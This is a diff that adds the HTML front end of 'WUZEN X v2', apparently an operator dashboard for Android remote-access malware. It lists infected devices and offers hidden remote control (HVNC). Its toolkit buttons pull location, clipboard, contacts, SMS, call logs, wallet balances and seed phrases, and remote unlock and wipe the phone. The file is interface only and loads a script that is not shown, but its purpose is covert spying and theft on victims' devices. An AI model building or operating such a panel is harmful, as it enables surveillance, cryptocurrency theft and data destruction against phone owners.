@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>WUZEN X — Dashboard</title>
+<link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<div class="app">
+  <!-- Sidebar -->
+  <nav class="sidebar" id="sidebar">
+    <div class="logo">
+      <span class="logo-icon">⬡</span>
+      <span class="logo-text">WUZEN X</span>
+      <span class="badge-pro">v2</span>
+    </div>
+    <div class="nav-section">
+      <a class="nav-item active" onclick="navigate('dashboard')">
+        <span class="nav-icon">📊</span> Dashboard
+      </a>
+      <a class="nav-item" onclick="navigate('devices')">
+        <span class="nav-icon">📱</span> Devices
+        <span class="badge" id="deviceBadge">0</span>
+      </a>
+      <a class="nav-item" onclick="navigate('hvnc')">
+        <span class="nav-icon">🎥</span> HVNC
+      </a>
+      <a class="nav-item" onclick="navigate('toolkit')">
+        <span class="nav-icon">🔧</span> Toolkit
+      </a>
+      <a class="nav-item" onclick="navigate('logs')">
+        <span class="nav-icon">📝</span> Logs
+      </a>
+      <a class="nav-item" onclick="navigate('settings')">
+        <span class="nav-icon">⚙️</span> Settings
+      </a>
+    </div>
+    <div class="sidebar-footer">
+      <a class="nav-item" onclick="logout()">
+        <span class="nav-icon">🚪</span> Logout
+      </a>
+    </div>
+  </nav>
+
+  <!-- Main Content -->
+  <main class="main" id="mainContent">
+    <header class="topbar">
+      <button class="menu-btn" onclick="toggleSidebar()">☰</button>
+      <h1 id="pageTitle">Dashboard</h1>
+      <div class="topbar-stats">
+        <div class="stat mini">
+          <span class="stat-num" id="headerOnline">0</span>
+          <span class="stat-label">Online</span>
+        </div>
+        <div class="stat mini">
+          <span class="stat-num" id="headerTotal">0</span>
+          <span class="stat-label">Total</span>
+        </div>
+      </div>
+    </header>
+
+    <div class="content" id="pageContent">
+      <!-- Dashboard View -->
+      <div id="view-dashboard" class="view active">
+        <div class="stats-grid">
+          <div class="stat-card primary">
+            <div class="stat-value" id="statOnline">0</div>
+            <div class="stat-label">Online</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="statTotal">0</div>
+            <div class="stat-label">Total</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="statModels">0</div>
+            <div class="stat-label">Models</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="statBattery">0%</div>
+            <div class="stat-label">Avg Battery</div>
+          </div>
+        </div>
+        <div class="section-title">Recent Devices</div>
+        <div class="device-grid" id="dashboardDevices"></div>
+      </div>
+
+      <!-- Devices View -->
+      <div id="view-devices" class="view">
+        <div class="section-title">All Devices</div>
+        <div class="device-grid" id="allDevices"></div>
+      </div>
+
+      <!-- HVNC View -->
+      <div id="view-hvnc" class="view">
+        <div class="hvnc-controls">
+          <select class="hvnc-select" id="hvncDeviceSelect">
+            <option value="">Select a device...</option>
+          </select>
+          <button class="btn primary" onclick="startHVNC()">▶ Start HVNC</button>
+          <button class="btn danger" onclick="stopHVNC()">⏹ Stop</button>
+          <button class="btn" onclick="sendHVNCCmd('screenshot')">📸 Capture</button>
+        </div>
+        <div class="hvnc-viewer" id="hvncViewer">
+          <div class="hvnc-placeholder">Select a device and start HVNC</div>
+        </div>
+        <div class="hvnc-tools">
+          <button class="btn" onclick="sendHVNCCmd('home')">🏠 Home</button>
+          <button class="btn" onclick="sendHVNCCmd('back')">🔙 Back</button>
+          <button class="btn" onclick="sendHVNCCmd('recents')">📋 Recent</button>
+          <button class="btn" onclick="sendHVNCCmd('lock')">🔒 Lock</button>
+          <button class="btn" onclick="sendHVNCCmd('notifications')">🔔 Notif</button>
+          <button class="btn" onclick="sendHVNCCmd('quick_settings')">⚡ QS</button>
+        </div>
+      </div>
+
+      <!-- Toolkit View -->
+      <div id="view-toolkit" class="view">
+        <div class="section-title">Toolkit</div>
+        <div class="toolkit-grid">
+          <div class="toolkit-card" onclick="quickCmd('screenshot')">
+            <div class="toolkit-icon">📸</div>
+            <div class="toolkit-name">Screenshot</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('location')">
+            <div class="toolkit-icon">📍</div>
+            <div class="toolkit-name">Location</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('clipboard')">
+            <div class="toolkit-icon">📋</div>
+            <div class="toolkit-name">Clipboard</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('balance')">
+            <div class="toolkit-icon">💰</div>
+            <div class="toolkit-name">Balance</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('seed')">
+            <div class="toolkit-icon">🌱</div>
+            <div class="toolkit-name">Seed Phrase</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('contacts')">
+            <div class="toolkit-icon">👤</div>
+            <div class="toolkit-name">Contacts</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('sms_list')">
+            <div class="toolkit-icon">📨</div>
+            <div class="toolkit-name">SMS</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('call_log')">
+            <div class="toolkit-icon">📞</div>
+            <div class="toolkit-name">Call Log</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('apps')">
+            <div class="toolkit-icon">📲</div>
+            <div class="toolkit-name">Apps</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('network')">
+            <div class="toolkit-icon">📡</div>
+            <div class="toolkit-name">Network</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('unlock')">
+            <div class="toolkit-icon">🔓</div>
+            <div class="toolkit-name">Unlock</div>
+          </div>
+          <div class="toolkit-card" onclick="quickCmd('wipe')">
+            <div class="toolkit-icon">💣</div>
+            <div class="toolkit-name">Wipe</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Logs View -->
+      <div id="view-logs" class="view">
+        <div class="section-title">Live Logs</div>
+        <div class="logs-container" id="logsContainer">
+          <div class="log-entry info">[System] Dashboard connected</div>
+        </div>
+      </div>
+
+      <!-- Settings View -->
+      <div id="view-settings" class="view">
+        <div class="section-title">Settings</div>
+        <div class="settings-card">
+          <div class="setting-row">
+            <span>Server Status</span>
+            <span class="badge green" id="serverStatus">Online</span>
+          </div>
+          <div class="setting-row">
+            <span>WebSocket</span>
+            <span class="badge green" id="wsStatus">Connected</span>
+          </div>
+          <div class="setting-row">
+            <span>Auto Refresh</span>
+            <label class="switch"><input type="checkbox" id="autoRefresh" checked onchange="toggleAutoRefresh()"><span class="slider"></span></label>
+          </div>
+          <div class="setting-row">
+            <span>Refresh Interval (s)</span>
+            <input type="number" id="refreshInterval" value="5" min="1" max="60" class="setting-input">
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script src="/script.js"></script>
+</body>
+</html>
